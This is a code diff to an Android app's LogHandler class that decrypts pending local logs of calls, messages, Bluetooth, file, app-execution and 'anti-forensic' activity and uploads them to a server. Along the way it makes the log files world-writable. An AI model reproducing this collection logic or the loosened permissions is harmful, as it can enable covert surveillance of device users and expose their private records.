@@ -186,6 +186,65 @@ public class LogHandler {
     }
 
     /**
+     * 온라인 복구 시 WorkManager에서 호출: 모든 로그 타입의 .txt 파일에 쌓인 내용을 서버로 전송.
+     * 큐 플러시 이후에 실행되어, 512KB 트리거 없이 오프라인에서 쌓인 .txt를 처리.
+     */
+    public static void sendAllPendingTxt(Context context, ServerTransmitter serverTransmitter) {
+        String deviceId = getAndroidID(context, context.getContentResolver());
+        String[] logTypes = {"AntiForensicLog", "CallingLog", "BluetoothLog",
+                "MessageLog", "FileLog", "AppExecutionLog"};
+        CryptoManager crypto = CryptoManager.getInstance();
+
+        for (String logType : logTypes) {
+            File dir = new File(context.getFilesDir(), logType);
+            File logFile = new File(dir, deviceId + "_" + logType + ".txt");
+            if (!logFile.exists() || logFile.length() == 0) continue;
+
+            try {
+                // 읽기 권한 열기
+                dir.setWritable(true, false);
+                dir.setExecutable(true, false);
+                logFile.setWritable(true, false);
+
+                byte[] raw = java.nio.file.Files.readAllBytes(logFile.toPath());
+                String rawText = new String(raw, java.nio.charset.StandardCharsets.UTF_8);
+
+                StringBuilder sb = new StringBuilder();
+                for (String line : rawText.split("\n")) {
+                    String trimmed = line.trim();
+                    if (trimmed.isEmpty()) continue;
+                    try {
+                        sb.append(crypto.decryptToString(trimmed)).append("\n");
+                    } catch (Exception ex) {
+                        sb.append(trimmed).append("\n");
+                    }
+                }
+                String logContent = sb.toString().trim();
+                if (logContent.isEmpty()) continue;
+
+                // 해시 계산
+                java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
+                String normalized = String.join("\n", logContent.split("\\r?\n"));
+                byte[] hashBytes = md.digest(normalized.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+                StringBuilder hashSb = new StringBuilder();
+                for (byte b : hashBytes) hashSb.append(String.format("%02x", b));
+                String hash = hashSb.toString();
+
+                Log.d(TAG, "[ONLINE] 네트워크 복구 후 .txt 전송: " + logType);
+                boolean sent = serverTransmitter.uploadEncryptedLog(deviceId, logType, logContent, hash);
+                if (sent) {
+                    clearLogFileStatic(context, deviceId, logType);
+                    Log.d(TAG, "[ONLINE] .txt 전송 성공: " + logType);
+                } else {
+                    Log.w(TAG, "[ONLINE→OFFLINE] .txt 전송 실패: " + logType);
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "sendAllPendingTxt error: " + logType, e);
+            }
+        }
+    }
+
+    /**
      * WorkManager에서 로거 인스턴스 없이 호출하는 정적 버전.
      * logType: "AntiForensicLog", "CallingLog" 등 (확장자 없이)
      */
